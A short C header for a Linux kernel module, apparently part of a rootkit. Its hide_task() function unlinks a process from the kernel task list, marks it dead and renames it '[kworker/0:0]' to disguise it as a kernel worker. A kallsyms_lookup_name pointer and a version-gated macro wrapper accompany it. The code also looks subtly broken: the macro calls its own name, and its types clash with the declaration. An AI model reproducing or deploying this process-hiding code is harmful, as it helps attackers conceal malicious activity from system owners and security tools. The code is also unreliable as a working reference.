#pragma once

#include <linux/sched.h>
#include <linux/version.h>

extern void *(*kallsyms_lookup_name)(const char *name);

void hide_task(struct task_struct *task) {
    list_del_init(&task->tasks);
    task->__state = TASK_DEAD;
    set_task_comm(task, "[kworker/0:0]");
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)
#define kallsyms_lookup_name(name) ({ \
    unsigned long addr; \
    preempt_disable(); \
    addr = kallsyms_lookup_name(name); \
    preempt_enable(); \
    addr; \
})
#endif
